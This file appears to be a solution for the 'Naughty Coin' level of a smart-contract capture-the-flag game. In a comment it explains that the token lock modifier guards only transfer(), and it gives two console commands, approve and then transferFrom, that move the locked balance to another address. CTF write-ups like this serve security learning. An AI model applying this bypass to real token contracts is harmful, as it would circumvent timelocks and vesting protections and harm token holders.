// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 15. NAUGHTY COIN
 * @dev Complete this level by getting your token balance to 0.
 */

/*
The modifier in charge of locking the tokens is poorly implemented. 
Let's take advantage of it to transfer the tokens to another address.

 1. Approve another address to transfer tokens on your behalf
const balance = "1000000000000000000000000";
await contract.approve("TheFutureCoinOwner", balance);

 2. Transfer the tokens to another address using the transferFrom function
await contract.transferFrom("YourAddressHere", "TheFutureCoinOwner", balance);


🎉 Level completed! 🎉
*/
